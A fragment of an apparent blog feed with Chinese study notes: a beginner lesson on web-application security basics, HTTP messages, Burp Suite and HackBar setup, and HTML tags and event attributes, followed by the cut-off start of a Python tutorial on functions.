        <content type="html"><![CDATA[<h2 id="WEB应用安全概述"><a href="#WEB应用安全概述" class="headerlink" title="WEB应用安全概述"></a>WEB应用安全概述</h2><p>（1）WEB应用安全是指WEB应用系统的安全性，由于WEB应用的特点，在安全性方面有许多有别于传统系统安全的内容。</p><p>（2）传统系统安全体系的建立：防火墙、入侵防护系统、漏洞扫描系统。80%以上的攻击通过应用程序漏洞来开展。</p><h3 id="常见WEB应用"><a href="#常见WEB应用" class="headerlink" title="常见WEB应用"></a>常见WEB应用</h3><p>（1）常见应用类型：CMS、论坛、电商平台、业务办理</p><p>（2）常见WEB应用：网站前台和网站后台。二者通常是相对于动态网站而言，即网站建设是基于数据库开发的网站。基于带数据库开发的网站，一般分为网站前台和网站后台。</p><p>（3）网站前台是面向网站用户访问的，通俗的说也就是给访问网站的人看的内容和页面，网站前台访问可以浏览公开发布的内容。</p><p>（4）网站后台，有时也称为网站管理后台，是指用于管理网站前台的一系列操作。网站的后台通常需要账号及密码等信息的登录验证，登录信息正确则验证而后进入网站后台的管理界面进行相关的一系列操作。<strong>由于网站后台具有更高的操作权限，往往是黑客攻击的重要目标.</strong></p><h3 id="WEB应用安全与传统安全的区别"><a href="#WEB应用安全与传统安全的区别" class="headerlink" title="WEB应用安全与传统安全的区别"></a>WEB应用安全与传统安全的区别</h3><table><thead><tr><th align="center">对比项</th><th align="center">传统系统安全</th><th align="center">WEB应用安全</th></tr></thead><tbody><tr><td align="center">通用性</td><td align="center">建立在使用较广的通用软件基础上</td><td align="center">每一个应用相当于一个独立的软件</td></tr><tr><td align="center">开发者</td><td align="center">通常是具有较高专业技术的厂商和人员，对安全有一定的理解</td><td align="center">开发者水平参差不齐，对于安全的理解较为往往不足</td></tr><tr><td align="center">漏洞的检测</td><td align="center">建立在漏洞已知、确定的基础上</td><td align="center">基于业务特点对可能存在的漏洞进行扫描</td></tr><tr><td align="center">漏洞的挖掘</td><td align="center">需要对计算机结构、操作系统原理，底层语言等有很深入的了解，难度大</td><td align="center">只需要掌握一些基础的网站架构、脚本语言、数据库知识就可以开始，难度低</td></tr><tr><td align="center">漏洞的修复</td><td align="center">由专业的厂商提供修复方案</td><td align="center">应用开发人员自行修复</td></tr><tr><td align="center">攻击途径</td><td align="center">多数服务端口不开放在公网上，攻击途径较少</td><td align="center">WEB应用的业务特点导致多数的WEB应用对于互联网是开放的</td></tr><tr><td align="center">攻击特征</td><td align="center">有数据级的攻击特征，攻击行为与正常业务行为的差异明显</td><td align="center">攻击特征不明确，业务逻辑类漏洞在数据层面无攻击特征</td></tr><tr><td align="center">防护难度</td><td align="center">对于已知漏洞的防护较为容易</td><td align="center">防护难度大，容易绕过</td></tr></tbody></table><h2 id="WEB应用的基本架构"><a href="#WEB应用的基本架构" class="headerlink" title="WEB应用的基本架构"></a>WEB应用的基本架构</h2><p>（1）组成：终端用户、应用传输协议http、应用服务器、数据库服务器</p><p>（2）</p><table><thead><tr><th align="center"></th><th align="center">客户端</th><th align="center">服务端</th><th align="center">数据库</th></tr></thead><tbody><tr><td align="center">应用</td><td align="center">客户端浏览器(IE、Firefox…)</td><td align="center">服务端WEB应用(IIS、Apache)</td><td align="center"></td></tr><tr><td align="center">语言</td><td align="center">HTML、javascript、CSS</td><td align="center">PHP、JSP、ASP</td><td align="center">SQL</td></tr></tbody></table><h3 id="WEB服务的提供者——WEB中间件"><a href="#WEB服务的提供者——WEB中间件" class="headerlink" title="WEB服务的提供者——WEB中间件"></a>WEB服务的提供者——WEB中间件</h3><p>WEB中间件是用来提供WEB服务的应用软件，常说的WEB服务器其实就是部署了WEB中间件能够提供WEB服务的服务器，常见的WEB中间件包括IIS、tomcat、apahce、weblogic、Nginx等。</p><h3 id="简单的WEB服务器搭建"><a href="#简单的WEB服务器搭建" class="headerlink" title="简单的WEB服务器搭建"></a>简单的WEB服务器搭建</h3><p><strong>PHPstudy简介</strong></p><p>（1）PHPstudy是一个PHP调试环境的程序集成包</p><p>（2）该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无需配置即可使用。该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。</p><p>（3）该程序包可以很好地解决Windows下环境配置的问题。</p><p><strong>PHPstudy的使用</strong></p><p>（1）打开phpstudy软件，可看到启动、停止、重启的按钮，可对phpstudy进行相应的操作。</p><p>（2）点击PHP版本，可看见phpstudy有多种版本可供选择。</p><p>（3）点击其他选项菜单——网站根目录，可在里面增加文件，即可通过浏览器访问</p><p><strong>PHPstudy的hello world</strong></p><p>（1）新建一个txt文档，在里面写入hello world，然后保存将后缀名改为test.html</p><p>（2）将test.html放入phpstudy的WWW目录中，即根目录下”/“，在url中可以体现文件的所在路径。</p><p>（3）启动phpstudy，在浏览器中输入[<a href="http://127.0.0.1/test.html],%E8%AE%BF%E9%97%AE%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%EF%BC%9A">http://127.0.0.1/test.html],访问结果如下：</a></p><h2 id="HTTP协议基础"><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h2><p>（1）HTTP是Hyper Text Transfer Protocol(超文本传输协议)的缩写。HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。</p><p>（2）HTTP是一个<strong>应用层协议</strong>，由<strong>请求和响应</strong>构成，是一个标准的客户端服务器模型。HTTP是一个无状态的协议。</p><h3 id="网页请求的基本过程"><a href="#网页请求的基本过程" class="headerlink" title="网页请求的基本过程"></a>网页请求的基本过程</h3><p><strong>请求触发–&gt;建立TCP连接–&gt;客户端发送HTTP请求–&gt;服务端返回HTTP响应–&gt;客户端显示结果</strong></p><p>当用户在浏览器中输入网址或点击超链接，网页请求就被发出了，其工作过程可分为四步：</p><p>（1）首先客户端与服务器需要建立TCP连接</p><p>（2）建立连接后，客户端发送一个请求给服务器，请求方式的格式为：统一资源标识符(URL)、协议版本号、后边是MIME信息、请求修饰符、客户机信息和可能的内容。</p><p>（3）服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息、服务器信息、实体信息和可能的内容。</p><p>（4）客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>若以上过程的某一步出现错误，则产生错误的信息将返回到客户端，通过显示屏输出。对用户来说，这些过程由HTTP自己完成，对用户透明。</p><h3 id="HackBar工具"><a href="#HackBar工具" class="headerlink" title="HackBar工具"></a>HackBar工具</h3><p>HackBar小工具包，包含一些常用的工具。(SQL injection、XSS、加密等)，web开发人员可以利用该工具，快速构建一个http请求，或者用它快速实现某种算法等。</p><h3 id="BurpSuite工具"><a href="#BurpSuite工具" class="headerlink" title="BurpSuite工具"></a>BurpSuite工具</h3><p>（1）Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，能更好地完成对web应用的渗透测试和攻击。</p><p>（2）Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量。如客户端的请求数据、服务端的返回信息等。Burp Suite主要拦截http和https协议的流量，通过拦截，Burp Suite以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估、测试的目的。</p><p><strong>BurpSuite的使用</strong></p><p>（1）配置监听选项：Proxy–&gt;Options，在Proxy Listeners中Add一条或者Edit一条监听地址及端口，如本地的8080端口。注意监听的端口不能和本机已使用的端口冲突。</p><p>（2）配置拦截选项：Proxy–&gt;Options，设置拦截请求包，设置拦截返回包</p><p>（3）浏览器的代理地址设置：</p><p>火狐浏览器设置步骤：菜单–&gt;选项–&gt;高级–&gt;网络—&gt;设置</p><p>Edge浏览器的设置步骤：在谷歌应用商店下载SwitchyOmega插件，在proxy情景模式下配置代理服务器，并保存</p><p>（4）请求与响应拦截：打开浏览器，输入访问的网址–&gt;设置浏览器代理–&gt;打开burpsuite，开启Intercept，在浏览器的hackbar中点击Execute–&gt;获取burpsuite抓取http报文–&gt;点击Forward提交、发送，会将访问的页面显示在浏览器上。</p><p>（5）数据报重放：抓取http的数据包后。右键单击——发送到Repeater–&gt;点击Repeater模块，在该模块能够显示请求包和回复包–&gt;在Request请求包里可以修改内容，点击Go之后，可以在Response回复包内容中显示返回在浏览器上的内容。</p><h3 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h3><p>HTTP请求由三部分组成：请求行、消息报头、请求正文</p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>包括http请求的种类/方法、请求资源的路径、http协议版本三个部分，以空格(%20)分隔，以回车换行符结尾(%0d%0a)。</p><pre><code class="Python">POST /search.php?searchsubmit=yes HTTP/1.1#POST为常见请求的种类/方法，定义了服务器收到请求后的“动作”#/search.php?searchsubmit=yes为请求资源的路径#HTTP/1.1是协议版本，目前默认为1.1</code></pre><table><thead><tr><th align="center">请求方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">GET</td><td align="center">请求指定的页面信息，并返回实体主体。</td></tr><tr><td align="center">POST</td><td align="center">向指定资源提交数据进行请求(例如提交表单或者上传文件)。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td></tr></tbody></table><p>（3）说明：出于安全考虑，通常要求服务器只允许使用GET和POST方法。</p><p>二者区别：GET请求的所提交的所有数据都在URL中体现，不利于提交复杂的数据，且安全性相对较低，而POST请求可以将主要数据放在请求正文中提交，常用于提交复杂数据或敏感信息。</p><h4 id="URL简介"><a href="#URL简介" class="headerlink" title="URL简介"></a>URL简介</h4><p>（1）URL又称统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置及浏览器应该怎么处理它。</p><p>（2）URL的基本构成：</p><p>schema://host[:port#]/path/…/[;url-params][?query-string][#anchor]</p><pre><code>http://www.domain.com:1234/path/to/resource?a=b&amp;x=y#http为协议(protocol)#www.domain.com为host，1234为端口#/path/to/resource为资源路径#?a=b&amp;x=y为对资源的查询操作(query)</code></pre><p>（3）URL编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值，将他们以name/value参数编码作为URL的一部分或者分离地发送给服务器，url编码就是一个字符ASCII码的十六进制，然后在其前面部分加上”%”</p><h4 id="消息报头"><a href="#消息报头" class="headerlink" title="消息报头"></a>消息报头</h4><p>（1）请求消息报头说明了客户端的基本信息，以及如何与客户端进行交互；</p><p>（2）消息报头由多行组成，每行以key:value的形式体现，每行末尾包括一个回车换行符(%0a%0d)，消息报头末尾以两个回车换行符作为结束。</p><table><thead><tr><th align="center">Header</th><th align="center">解释</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">Accept-Language</td><td align="center">浏览器可以接受的语言</td><td align="center">Accept-Language:en,zh</td></tr><tr><td align="center">Cookie</td><td align="center">HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器</td><td align="center">Cookie:Version=1;Skin=new;</td></tr><tr><td align="center">Content-Length</td><td align="center">请求的内容长度</td><td align="center">Content-Length:348</td></tr><tr><td align="center">Content-Type</td><td align="center">请求的内容对应的MIME信息</td><td align="center">Content-Type:application/x-www-form-urlencoded</td></tr><tr><td align="center">Host</td><td align="center">指定请求的服务器的域名和端口号(必选)</td><td align="center">Host:<a href="http://www.doone.com/">www.doone.com</a></td></tr><tr><td align="center">Referer</td><td align="center">表示当前是从哪个页面上的链接触发的</td><td align="center">Referer:<a href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives/71.html</a></td></tr><tr><td align="center">User-Agent</td><td align="center">User-Agent的内容包含发出请求的用户信息</td><td align="center">User-Agent:Mozilla/5.0(Linux;X11)</td></tr><tr><td align="center">X-Forwarded-For        client-ip</td><td align="center">用户通过代理服务器访问网站时代理服务器会自动添加该字段用于标记用户的真实IP</td><td align="center">X-Forwarded-For:1.1.1.1             client-ip:2.2.2.2</td></tr></tbody></table><h3 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h3><p>HTTP响应也由三部分组成，分别是：状态行、消息报头、响应正文</p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>（1）状态行包括http协议版本、状态码、状态描述三个部分，以空格符(%20)分隔，以回车换行符结尾(%0d%0a)</p><p>（2）状态代码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值。</p><pre><code>1xx：指示信息--表示请求已接收，继续处理2xx：成功--表示请求已被成功接收、理解、接受3xx：重定向--要完成请求必须进行更进一步的操作4xx：客户端错误--请求有语法错误或请求无法实现5xx：服务器端错误--服务器未能实现合法的请求</code></pre><p><img src="https://i.loli.net/2020/12/16/RBwkMDiAU8l1Pus.png" alt="image-20201216191016982"></p><h4 id="消息报头-1"><a href="#消息报头-1" class="headerlink" title="消息报头"></a>消息报头</h4><p>（1）消息报头说明了服务端的基本信息、客户端如何处理返回的消息等</p><p>（2）消息报头由多行组成，每行以key:value的形式体现，每行末尾包括一个回车换行符(%0a%0d)，消息报头末尾以两个回车换行符(%0a%0d)作为结束。</p><table><thead><tr><th align="center">Header</th><th align="center">解释</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">Allow</td><td align="center">服务器支持的请求方法，OPTIONS请求方法的响应头</td><td align="center">Allow:GET,HEAD,POST,OPTIONS</td></tr><tr><td align="center">Content-Encoding</td><td align="center">web服务器表明自己使用了什么压缩方法(gzip，deflate)压缩响应正文的内容</td><td align="center">Content-Encoding:gzip</td></tr><tr><td align="center">Content-Length</td><td align="center">响应正文的长度，以字节方式存储的十进制数字来表示</td><td align="center">Content-Length:42</td></tr><tr><td align="center">Content-Type</td><td align="center">响应正文的MIME类型和字符集</td><td align="center">Content-Type:text/html;charset=GB2312</td></tr><tr><td align="center">Location</td><td align="center">用于重定向一个新的位置，包含新的URL地址，表示客户应当到哪里去提取文档</td><td align="center">Location:<a href="http://www.baidu.com/search/error.html">http://www.baidu.com/search/error.html</a></td></tr><tr><td align="center">Server</td><td align="center">指明HTTP服务器用来处理请求的软件信息</td><td align="center">Server:nginx/1.5.4</td></tr><tr><td align="center">Set-Cookie</td><td align="center">用于把cookie发送到客户端浏览器，每一个写入cookie都会生成一个Set-Cookie</td><td align="center">Set-Cookie:sc=4c31523a;path=/;domain=.doone.com.con</td></tr><tr><td align="center">X-Powered-By</td><td align="center">表示网站使用什么技术开发的</td><td align="center">X-Powered-By:ASP.NET</td></tr></tbody></table><h2 id="HTML基本概念"><a href="#HTML基本概念" class="headerlink" title="HTML基本概念"></a>HTML基本概念</h2><p>（1）HTML是用来描述网页的一种语言</p><p>（2）HTML指的是超文本标记语言(Hyper Text Markup Language)</p><p>（3）HTML不是一种编程语言，而是一种标记语言，标记语言是一套标记标签</p><p>（4）HTML使用标记标签来描述网页</p><p>（5）HTML文档通常用htm和html作为后缀名</p><p>（6）Web浏览器的作用是读取HTML文档，并以网页的形式显示出他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。</p><h3 id="HTML基础语法"><a href="#HTML基础语法" class="headerlink" title="HTML基础语法"></a>HTML基础语法</h3><p>（1）HTML文档是由HTML元素定义的，HTML元素以开始标签(start tag)起始，以结束标签(end tag)终止</p><p>（2）元素的内容是开始标签与结束标签之间的内容</p><p>（3）某些HTML元素内容为空，空元素在开始标签中闭合，无结束标签</p><p>（4）大多数HTML元素可拥有属性，属性总是以名称/值对的形式出现，提供了有关HTML元素的更多信息。</p><p>属性总是在HTML元素的开始标签中规定；</p><p>属性值应该始终被包括在引号内，双引号是最常用的，不过使用单引号也没问题。</p><p>（5）有时候没有结束标签元素也可以正常显示，但是可能会出现意外错误，不建议使用</p><p><img src="https://i.loli.net/2020/12/16/ahLjpODg9TUnw6I.png" alt="image-20201216201051807"></p><h3 id="HTML文档结构"><a href="#HTML文档结构" class="headerlink" title="HTML文档结构"></a>HTML文档结构</h3><p><img src="https://i.loli.net/2020/12/16/Zkn2LoxrgEuS4wB.png" alt="image-20201216204841476"></p><pre><code class="html">&lt;!DOCTYPE html/&gt;&lt;html&gt;    &lt;head&gt;                            #&lt;head&gt;通常不显示        &lt;/head&gt;        &lt;meta charest=&quot;utf-8&quot;/&gt;       #主体的编码方式        &lt;title&gt;文档的标题&lt;/title&gt;           &lt;/head&gt;    &lt;body&gt;                           #body元素定义文档的主体    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/17/LEjQBNGDzkldbgs.png" alt="image-20201217211426549"></p><h3 id="HTML常见标签"><a href="#HTML常见标签" class="headerlink" title="HTML常见标签"></a>HTML常见标签</h3><p>（1）格式标签：&lt;h1&gt; to &lt;h6&gt;定义HTML标题。  &lt;br/&gt;定义换行</p><p>（2）链接标签：&lt;a&gt;定义超链接</p><p>（3）文本标签：&lt;input&gt;定义文本域</p><p>（4）多媒体标签：&lt;img&gt;定义图像</p><p>（5）&lt;body&gt;元素定义了HTML文档的主体</p><p>（6）&lt;html&gt;元素定义了整个HTML文档</p><h4 id="格式标签"><a href="#格式标签" class="headerlink" title="格式标签"></a>格式标签</h4><p>（1）&lt;h1&gt;标签可定义标题。&lt;h1&gt;定义最大的标题，&lt;h6&gt;定义最小的标题</p><p>（2）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;h1&gt;            这是标题1        &lt;/h1&gt;        &lt;h2&gt;            这是标题2        &lt;/h2&gt;        &lt;h3&gt;            这是标题3        &lt;/h3&gt;        &lt;h4&gt;            这是标题4        &lt;/h4&gt;        &lt;h5&gt;            这是标题5        &lt;/h5&gt;        &lt;h6&gt;            这是标题6        &lt;/h6&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/7mebkXYvxLt1SKu.png" alt="image-20201216205838653"></p><h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><p>（1）&lt;a&gt;标签定义超链接，用于从一个页面链接到另一个页面</p><p>（2）&lt;a&gt;元素最重要的属性是href属性，它指示链接的目标</p><p>（3）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;a href= &quot;http://www.goktech.cn&quot; &gt;国科科技&lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/dKCGo7iguY362Ua.png" alt="image-20201216210422270"></p><p><img src="https://i.loli.net/2020/12/16/ShCtUew8pV9I63k.png" alt="image-20201216210440769"></p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>（1）&lt;input&gt;标签用于搜集用户信息。根据不同的type属性值，输入字段拥有很多种形式。</p><p>（2）输入字段可以是文本字段、复选框、掩码后的文本控件、单选按钮、按钮等等。</p><p>（3）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;/&gt;&lt;br&gt;            Last name: &lt;input type= &quot;text&quot; name=&quot;Iname&quot;/&gt;&lt;br&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/xKhX7fDPcCsFkuv.png" alt="image-20201216211427660"></p><h4 id="图像标签"><a href="#图像标签" class="headerlink" title="图像标签"></a>图像标签</h4><p>（1）&lt;img&gt;标签向网页中嵌入一幅图像</p><p>（2）&lt;img&gt;标签有两个必需的属性：src属性和alt属性</p><p>（3）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;img src=&quot;http://www.goktech.cn/img/img_index/logo2.png&quot;/&gt;        &lt;br/&gt;        &lt;br&gt;        &lt;img src=&quot;/html/images/eg_tulip.jpg&quot;&gt;&lt;br/&gt;        &lt;br&gt;        &lt;br&gt;        &lt;img src=&quot;/images/1.jpg&quot; alt=&quot;玫瑰花&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/lP7hgsCdaKpWbQo.png" alt="image-20201216213448240"></p><p>若无法显示图像，浏览器将显示替代文本</p><p><img src="https://i.loli.net/2020/12/16/pFnAySDEhsPUoHg.png" alt="image-20201216213511013"></p><h3 id="事件属性与Windos对象方法"><a href="#事件属性与Windos对象方法" class="headerlink" title="事件属性与Windos对象方法"></a>事件属性与Windos对象方法</h3><p>（1）HTML事件属性是一种特殊的属性，提供了事件在浏览器中触发动作的能力，比如当用户点击元素时启动JavaScript</p><p>（2）Window对象方法提供了一些简单的动作，如弹出对话框的能力，window对象方法与事件结合使用可以实现一些简单的交互功能。</p><p>（3）基本用法：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;input type=&quot;text&quot; onclick=&quot;alert(&#39;您好，请输入&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/PViqu2ErGCteTg4.png" alt="image-20201216220517460"></p><h3 id="常见事件属性与windows对象方法"><a href="#常见事件属性与windows对象方法" class="headerlink" title="常见事件属性与windows对象方法"></a>常见事件属性与windows对象方法</h3><p><strong>常见事件属性</strong></p><p>（1）鼠标事件：</p><pre><code>Onclick;元素上发生鼠标点击时触发。Ondblclick：元素上发生鼠标双击时触发0nmouseover：当鼠标指针移动到元素上时触发onmouseout：当鼠标指针移除元素时触发</code></pre><p>（2）键盘事件：</p><pre><code>Onkeydown：当用户按下按键时触发</code></pre><p>（3）Form事件：</p><pre><code>Onchange:在元素值被改变时触发Onfocus：当元素获得焦点时触发</code></pre><p><strong>常见对象方法</strong></p><p>（1）alert():显示带有一段消息和一个确认按钮的警告框</p><p>（2）confirm():显示带有一段消息以及确认按钮和取消按钮的对话框</p><p>（3）prompt():显示可提示用户输入的对话框</p><h3 id="事件属性与windows对象方法实例"><a href="#事件属性与windows对象方法实例" class="headerlink" title="事件属性与windows对象方法实例"></a>事件属性与windows对象方法实例</h3><p>(1)onmouseover属性在鼠标指针移动到元素上时触发。当用户把鼠标移动到图片上时，会显示可提示用户输入的对话框。</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;img onmouseover=&quot;prompt()&quot; src=&quot;/images/eg_chinarose.jap&quot;&gt;    &lt;/head&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/NPQ7xscjLnp43mr.png" alt="image-20201216223834282"></p><p>（2）onchange属性在元素值被改变时触发</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        请输入您的姓名：        &lt;input type=&quot;text&quot; onchange=&quot;confirm(&#39;Good Good study,Day Day up!&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>当在输入框输入姓名回车后，会弹出信息的提示框</p><p><img src="https://i.loli.net/2020/12/16/dESxU2gyarJhoXF.png" alt="image-20201216224229033"></p><h3 id="HTML标签嵌套"><a href="#HTML标签嵌套" class="headerlink" title="HTML标签嵌套"></a>HTML标签嵌套</h3><p>（1)HTML标签通常都是互相嵌套的，通过相互嵌套标签可以实现各类复杂的效果。</p><p>（2）例如：将IMG标签嵌套至A标签的内容位置，可以使得图片变成一个可点击的链接。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=http://www.baidu.com&gt;            &lt;img src=&quot;https://www.baidu.com/img/bd_logo1.png&quot; alt=&quot;baidu&quot; width=&quot;100&quot; height=&quot;42&quot;&gt;        &lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/BlAofEQndb8RYmL.png" alt="image-20201216235827081"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(五)-函数和代码复用01</title>
      <link href="2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/"/>
      <url>2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的基本使用"><a href="#函数的基本使用" class="headerlink" title="函数的基本使用"></a>函数的基本使用</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p>（1）函数是一段具有特定功能的、可重用的语句组，用函数名来表示并通过函数名进行功能调用。函数可以在一个程序中的多个位置使用，也可以用于多个程序。函数可以是自己编写的，称为自定义函数；也可以是Python内置的函数。</p><p>（2）Python使用def保留字定义了一个函数，语法形式如下：</p><pre><code class="Python">def &lt;函数名&gt;(&lt;参数列表&gt;):    &lt;函数体&gt;    return &lt;返回值列表&gt;&#39;&#39;&#39;函数名可以是任何有效的Python标识符；参数列表是调用该函数时传递给它的值，可以有0个或多个，传递多个参数时用逗号分隔，这里的参数是形式参数，简称&quot;形参&quot;；函数体是函数每次被调用时执行的代码；当需要返回值时，使用保留字return和返回值列表，否则可以没有return语句&#39;&#39;&#39;</code></pre><p>（3）函数调用和执行的一般形式:&lt;函数名&gt;(&lt;参数列表&gt;)。此时，参数列表中给出要传入函数内部的参数，这类参数称为实际参数，简称“实参”。实例：生日歌</p><pre><code class="python">def happy():    print(&quot;Happy birthday to you!&quot;)def happyB(name):    happy()    happy()    print(&quot;Happy birthday, dear &#123;&#125;!&quot;.format(name))    happy()happyB(&quot;Mike&quot;)print()happyB(&quot;Lily&quot;)</code></pre><h3 id="函数的调用过程"><a href="#函数的调用过程" class="headerlink" title="函数的调用过程"></a>函数的调用过程</h3><p>（1）函数调用步骤：调用程序在调用处暂停执行–&gt;在调用时将实参复制给函数的形参–&gt;执行函数体语句–&gt;函数调用结束给出返回值，程序回到调用前的暂停处继续执行。</p><p>（2）由于函数只有在被调用时才执行，因此，上面的实例中，前7行代码不直接执行。程序最先执行的语句是第8行的happyB(“Mike”)。</p><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><p>（1）lambda保留字用于定义一种特殊的函数——匿名函数，又叫lambda函数。</p><p>（2）匿名函数并非没有名字，而是将表达式作为函数结果返回，语法格式如下：</p><pre><code class="Python">&lt;函数名&gt; = lambda &lt;参数列表&gt;： &lt;表达式&gt;等价于：def &lt;函数名&gt;(&lt;参数列表&gt;)：    return &lt;表达式&gt;</code></pre><p>（3）实例：</p><pre><code class="python">&gt;&gt;&gt; f = lambda x, y : x + y&gt;&gt;&gt; type(f)&lt;class &#39;function&#39;&gt;&gt;&gt;&gt; f(10,12)22</code></pre><h2 id="函数的参数传递"><a href="#函数的参数传递" class="headerlink" title="函数的参数传递"></a>函数的参数传递</h2><p><strong>要点：函数可以定义可选参数，使用参数的位置或名称传递参数值，根据函数中变量的不同作用域有不同的函数返回值方式</strong></p><h3 id="可选参数和可变数量参数"><a href="#可选参数和可变数量参数" class="headerlink" title="可选参数和可变数量参数"></a>可选参数和可变数量参数</h3><p>（1）在定义函数时，如果有些参数存在默认值，可以直接为这些参数指定默认值。当函数被调用时，如果没有传入对应的参数值，则使用函数定义时的默认值替代。例如：</p><pre><code class="python">&gt;&gt;&gt; def dup(str, times = 2):    print(str*times)&gt;&gt;&gt; dup(&quot;knock!&quot;)knock!knock!&gt;&gt;&gt; dup(&quot;knock!&quot;,4)knock!knock!knock!knock!</code></pre><p>（2）由于函数调用时需要按顺序输入参数，可选参数必须定义在非可选参数的后面，即dup()函数中默认值的可选参数times必须定义在str参数后面。</p><p>（3）函数在定义的时，也可以设计可变数量参数，通过在参数前增加星号(*)实现。带有星号的可变参数只能出现在参数列表的最后。调用时，这些参数被当做元组类型传递到函数中。</p><pre><code class="python">&gt;&gt;&gt; def vfunc(a, *b):    print(type(b))    for n in b:        a+=n    return a&gt;&gt;&gt; vfunc(1,2,3,4,5)&lt;class &#39;tuple&#39;&gt;15</code></pre><p>（4）上例中vfunc()函数定义了可变参数b，调用vfunc()函数时输入的(2,3,4,5)被当做元祖传递给b，与a累加后输出，这里可以将元祖理解为一组元素。</p><h3 id="参数的位置和名称传递"><a href="#参数的位置和名称传递" class="headerlink" title="参数的位置和名称传递"></a>参数的位置和名称传递</h3><p>（1）函数调用时，实参默认采用按照位置顺序的方式传递给函数，例如dup(“knock!”,4)中第一个实参默认赋值给形参str，第二个实参赋值给形参times。但当参数很多时，这种调用参数的方式可读性较差。例如：</p><pre><code class="python">#假设func()函数有6个参数，它的定义如下，其中参数分别表示两组三维坐标值&gt;&gt;&gt;def func(x1,y1,z1,x2,y2,z2):    retrun#它的一个实际调用如下：&gt;&gt;&gt;result = func(1,2,3,4,5,6)</code></pre><p>（2）若仅看实际调用而不看函数定义，很难理解这些输入参数的意义。在大规模的程序中，函数定义可能在函数库中，也可能与调用相距很远，带来的可读性较差。</p><p>（3）为解决上述问题，Python提供了按照形参名称输入实参的方式，此时函数调用如下：</p><pre><code class="python">&gt;&gt;&gt;result = func(x1=1,y1=2,z1=3,x2=4,y2=5,z2=6)#也可如下方式调用：&gt;&gt;&gt;result = func(x2=4,y2=5,z2=6,x1=1,y1=2,z1=3)</code></pre><p>（4）由于调用函数时指定了参数名称，所以参数之间的顺序可以任意调整。</p><h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>（1）return语句用来退出函数并将程序返回到函数被调用的位置继续执行。return语句可以同时将0个、1个或多个函数运算后的结果返回给函数被调用处的变量，</p><pre><code 